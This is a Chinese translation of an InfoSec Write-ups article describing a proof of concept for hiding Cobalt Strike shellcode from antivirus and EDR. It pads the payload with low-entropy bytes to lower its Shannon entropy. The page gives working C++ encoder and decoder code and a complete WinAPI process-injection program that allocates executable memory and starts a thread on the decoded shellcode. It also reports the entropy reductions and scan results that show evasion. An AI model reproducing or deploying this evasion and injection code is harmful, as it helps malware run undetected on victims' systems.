<html>
<head>
<title>The more predictable you are, the less you get detected — hiding malicious shellcodes via Shannon encoding</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">你越容易被预测，就越不容易被检测到——通过香农编码隐藏恶意外壳代码</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/the-more-predictable-you-are-the-less-you-get-detected-hiding-malicious-shellcodes-via-shannon-111a83fe60e4?source=collection_archive---------2-----------------------#2022-07-22">https://infosecwriteups.com/the-more-predictable-you-are-the-less-you-get-detected-hiding-malicious-shellcodes-via-shannon-111a83fe60e4?source=collection_archive---------2-----------------------#2022-07-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><h1 id="8182" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">你越容易被预测，就越不容易被发现</h1><p id="d603" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">最近，我在Github上发表了一篇小的PoC文章，讲述了一种通过降低PE的熵来隐藏恶意外壳代码的方法。</p><p id="8885" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">熵是对一组数据(这里是外壳代码)随机性的度量。熵越高，数据越随机。香农熵是一种算法，将产生0到8之间的结果，其中8表示数据中没有模式，因此它非常随机，0表示数据遵循一种模式。</p><h1 id="704e" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">高熵外壳代码的问题</h1><p id="842c" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">恶意代码的熵随着其被打包或混淆而增加。事实上，研究表明，熵可被用来基于其熵成功地区分非恶意代码和恶意代码。根据<a class="ae lj" href="https://umbrella.cisco.com/blog/using-entropy-to-spot-the-malware-hiding-in-plain-sight" rel="noopener ugc nofollow" target="_blank">思科</a> : <em class="lp">的说法，开发一个图像文件熵值正常范围的数据库将有助于威胁研究人员和事件响应团队更快地识别那些发生可疑数据传输的文件。</em>恶意样本的熵值超过7.2，而正常软件的熵值为4.8到7.2。在30%的恶意样本中，熵将接近8，而只有1%的无害代码具有该值。超过一半的恶意样本的熵将超过7.2，但每十个正常程序中只有一个会有这种程度的熵。总而言之，不是所有的恶意样本(尽管大多数会)都具有高熵，也不是所有的有效程序都具有低熵(但大多数会)。打包是减少可执行文件大小和保护资源的真正策略，许多程序都利用了这一点，这一事实解释了为什么合法样本可以具有高熵。</p><h1 id="1eb5" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">避免高熵算法</h1><p id="8f15" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">在我的研究中，我注意到默认的Cobalt Strike外壳代码的熵值是7.4，很高！通过使用不增加熵的算法(如XORing和Base64编码)，有许多方法可以混淆代码。我认为最后一个更方便，但这并不意味着它是完美的。XORing和Base64编码可以很容易地被解密，以揭露代码的真正目的。也可以直接创建签名，既可以针对xor也可以针对Base64编码的数据。最后，一些反恶意软件解决方案甚至可以在分析的仿真阶段解码这些简单的方案。</p><h1 id="5311" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">解决方案</h1><p id="91fd" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">如果随机性是问题所在，为什么不尝试通过引入减少不可预测性从而减少全局熵的模式来掩盖有害的混淆代码呢？以这种方式，你不局限于使用基本技术来混淆代码，并保持不被反恶意软件解决方案检测到；此外，混淆代码可以是任何大小。</p><h1 id="16d0" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">概念验证的工作原理</h1><p id="79fe" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">其概念是将数组分成块，并在每个块之间插入低熵模式的字节。当样本运行时，我们必须在内存中重建原始有效载荷，在这个阶段绕过高熵代码的静态检测。还值得注意的是，要插入的低熵代码可以遵循多种模式，并且插入的数量可以变化，因此它可以用于规避静态签名检测。第二步是将高熵字节块与低熵字节块合并。因为，毕竟，我们需要将混淆的代码恢复到它最初的样子，以便进行去混淆步骤，第三个作业将通过删除低熵模式来恢复原始的字节数组。</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="7a22" class="lz jo iq lv b gy ma mb l mc md">#include &lt;cstdio&gt;<br/>#include &lt;Windows.h&gt;<br/>#include "Entropy.h"<br/><br/>using namespace std;<br/><br/>BYTE payload[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc8,0x00,0x00,0x00,0x41,0x51,0x41,0x50 ... 0x36,0x30,0x00,0x5e,0x2e,0x78,0x90 }; // Simulated high entropy code<br/>constexpr int number_of_chunks = 5; // Number of chunks. You can randomize this too.<br/>constexpr int chunk_size = sizeof payload / number_of_chunks; // Size of each chunk<br/>constexpr int remaining_bytes = sizeof payload % number_of_chunks; // Remaining bytes after the last chunk is processed<br/>BYTE lowEntropyShellcode[sizeof payload * 2 - remaining_bytes] = {0}; // array of bytes size calculation to contain the original high entropy code plus the low entropy inserts<br/>constexpr int payload_size_after_entropy_reduction = sizeof payload * 2; // Total size of the reduced entropy payload</span></pre><p id="7d87" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">请注意，所有这些计算都存储在全局变量中，高熵代码也位于代码的全局区域中，以确保它将存储在可执行文件的数据部分，但它也可以完全位于资源部分，并在运行时加载。您甚至可以将高熵字节模式存储在main函数中，但是该模式将存储在。文本部分，它将被加载到堆栈中，而不是堆中，因为它存储在数据部分或资源部分。这很重要，因为堆栈不能处理非常大的字节数组，而且当数组太大时，一些编译器会抱怨这一点。</p><p id="c4b9" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">下一个任务是将高熵代码分成块，并添加低熵模式:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="bf7e" class="lz jo iq lv b gy ma mb l mc md">PBYTE shannonEncode(PBYTE rawShellcode)<br/>{<br/>	constexpr int max_n = 0xEF; //239<br/>	constexpr int min_n = 0x01; //1<br/>	char random_hex[chunk_size];<br/>	int encodedShellcodeOffset = 0;<br/>	int shellcodeOffset = 0;<br/>	const BYTE new_n = static_cast&lt;BYTE&gt;((rand() % (max_n + 1 - min_n) + min_n));<br/>	for (char&amp; i : random_hex)<br/>	{<br/>		i = static_cast&lt;char&gt;(new_n);<br/>	}<br/>	for (size_t i = 0; i &lt; number_of_chunks; i++)<br/>	{<br/>		for (size_t j = 0; j &lt; chunk_size; j++)<br/>		{<br/>			lowEntropyShellcode[encodedShellcodeOffset] = rawShellcode[shellcodeOffset];<br/>			encodedShellcodeOffset++;<br/>			shellcodeOffset++;<br/>		}<br/>		for (const char k : random_hex)<br/>		{<br/>			lowEntropyShellcode[encodedShellcodeOffset] = k;<br/>			encodedShellcodeOffset++;<br/>		}<br/>	}<br/>	if (remaining_bytes)<br/>	{<br/>		for (size_t i = 0; i &lt; sizeof remaining_bytes; i++)<br/>		{<br/>			lowEntropyShellcode[encodedShellcodeOffset++] = rawShellcode[shellcodeOffset++];<br/>		}<br/>	}<br/>	for (int count = 0; count &lt; sizeof(lowEntropyShellcode); count++) {<br/>		printf("0x%02X,", lowEntropyShellcode[count]);<br/>	}<br/>	return lowEntropyShellcode;<br/>}</span></pre><p id="926b" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">让我们用图表来解释一下。假设属于高熵块的字节由字母“H”表示，属于低熵块的低熵字节由字母“L”表示，其余从未修改的字节由字母“R”表示</p><figure class="lq lr ls lt gt mf gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi me"><img src="../Images/1dc494f9e2499284b4bbbb47aa61d34e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*6KfKV8bvNdcTRhNW"/></div></div></figure><h1 id="4e1e" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">简单外壳代码注入PoC</h1><p id="b72b" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">为了在进程中注入外壳代码，通过使用<a class="ae lj" href="https://github.com/kleiton0x00/Shelltropy/blob/main/shannonDecoder.cpp" rel="noopener ugc nofollow" target="_blank">解码器脚本</a>，将这个低熵外壳代码恢复到其原始状态(高熵外壳代码)是很重要的。解码后，使用WinAPI或Syscalls将其注入到所需的进程中。一个简单的<a class="ae lj" href="https://github.com/kleiton0x00/Shelltropy/blob/main/Shelltropy/SyscallsExample/SyscallsExample/SyscallsExample.cpp" rel="noopener ugc nofollow" target="_blank"> Syscall PoC </a>已经在我的github repo上发布了，这也是我通常推荐使用的，但是如果你觉得难以理解/使用，下面的PoC是一个带有WinAPI的普通外壳代码注入技术，更容易熟悉:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="3676" class="lz jo iq lv b gy ma mb l mc md">#include &lt;windows.h&gt;<br/>#include &lt;stdio.h&gt;<br/><br/>//low entropy encoded CS Shellcode (size:891*2)<br/>unsigned char payload[] = { 0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC8,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,...,0x2A,0x2A,0x2A,0x2A,0x90 };<br/>constexpr int cs_shellcode_length = 891; //the default length of high entropy default shellcode in cobalt strike. Change it if you are using another C2<br/>constexpr int number_of_chunks = 5; //make sure it is the same number of chunks during the encoding process<br/>constexpr int chunk_size = cs_shellcode_length / number_of_chunks;<br/>constexpr int remaining_bytes = cs_shellcode_length % number_of_chunks;<br/>constexpr int payload_size_after_entropy_reduction = cs_shellcode_length * 2;<br/><br/>PBYTE shannonDecode(PBYTE high_ent_payload)<br/><br/>{<br/>    constexpr int payload_size = (payload_size_after_entropy_reduction + 1) / 2;<br/>    BYTE lowEntropyPayload[payload_size_after_entropy_reduction] = { 0 };<br/>    memcpy_s(lowEntropyPayload, sizeof lowEntropyPayload, high_ent_payload, payload_size_after_entropy_reduction);<br/>    static BYTE restored_payload[payload_size] = { 0 };<br/>    int encodedShellcodeOffset = 0;<br/>    int shellcodeOffset = 0;<br/><br/>    for (size_t i = 0; i &lt; number_of_chunks; i++)<br/>    {<br/>        for (size_t j = 0; j &lt; chunk_size; j++)<br/>        {<br/>            restored_payload[shellcodeOffset] = lowEntropyPayload[encodedShellcodeOffset];<br/>            encodedShellcodeOffset++;<br/>            shellcodeOffset++;<br/>        }<br/><br/>        for (size_t k = 0; k &lt; chunk_size; k++)<br/>        {<br/>            encodedShellcodeOffset++;<br/>        }<br/>    }<br/><br/>    if (remaining_bytes)<br/>    {<br/>        for (size_t i = 0; i &lt; sizeof remaining_bytes; i++)<br/>        {<br/>            restored_payload[shellcodeOffset++] = high_ent_payload[encodedShellcodeOffset++];<br/>        }<br/>    }<br/>    return restored_payload;<br/>}<br/><br/>int main() {<br/>    //decode the low-entropy shellcode<br/>    const auto shellcode = shannonDecode(payload);<br/><br/>    // here starts the Process Injection<br/>    // Alloc memory<br/>    LPVOID addressPointer = VirtualAlloc(NULL, cs_shellcode_length, 0x3000, 0x40);<br/>    // Copy shellcode<br/>    RtlMoveMemory(addressPointer, shellcode, cs_shellcode_length);<br/>    // Create thread pointing to shellcode address<br/>    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);<br/>    // Sleep for a second to wait for the thread<br/>    Sleep(1000);<br/>    return 0;<br/>}</span></pre><h1 id="da90" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">熵结果</h1><p id="3cb9" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated"><strong class="kn ir">注:</strong>以下结果仅用CS Shellcode测试。</p><p id="41a5" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">~ Raw默认钴击外壳代码<br/>(高熵)正常:<strong class="kn ir"> 7.062950 </strong> <br/>(低熵)编码:<strong class="kn ir"> 4.527140 </strong></p><p id="a82b" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">~ XORed钴击外壳代码<br/>(高熵)正常:<strong class="kn ir"> 4.583139 </strong> <br/>(低熵)编码:<strong class="kn ir"> 3.278284 </strong></p><h1 id="7781" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">AV/EDR扫描结果</h1><p id="2200" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">高熵(左侧)与低熵(右侧)默认CS外壳代码与Syscalls (Syswhispers2)集成:</p><figure class="lq lr ls lt gt mf gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi me"><img src="../Images/3dc4bdda83cc3ba8c2277466e8284fa4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ZILDMLWjCrUsDQlY.jpg"/></div></div></figure><h1 id="102d" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">不足之处</h1><p id="0a6c" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">编码时，外壳代码的大小将增加2倍，使蓝队/恶意软件分析更容易检测到这种编码的外壳代码。</p><h1 id="e6a1" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">摘要</h1><p id="2504" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">减少混淆的恶意软件代码的熵是简单的；它可以用来躲避检测，除此之外，它还可以提供一些额外的保护来防止签名的形成。正如<a class="ae lj" href="https://www.cyberbit.com/blog/endpoint-security/malware-terms-code-entropy/" rel="noopener ugc nofollow" target="_blank"> Cyberbit </a>所说:<em class="lp">代码熵越低，代码被混淆的可能性就越低。</em>这里描述的代码可以被修改来构建解决方案，帮助避免使用熵作为恶意软件检测方法。使用替代的数学方程和不同大小的低熵代码块来创建更好的低熵字节模式可以提高该方法的可靠性。</p></div><div class="ab cl mm mn hu mo" role="separator"><span class="mp bw bk mq mr ms"/><span class="mp bw bk mq mr ms"/><span class="mp bw bk mq mr"/></div><div class="ij ik il im in"><p id="4701" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated"><em class="lp">来自Infosec的报道:Infosec上每天都会出现很多难以跟上的内容。加入我们的每周简讯，以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em><a class="ae lj" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"><em class="lp">https://weekly.infosecwriteups.com/</em></a></p></div></div>    
</body>
</html>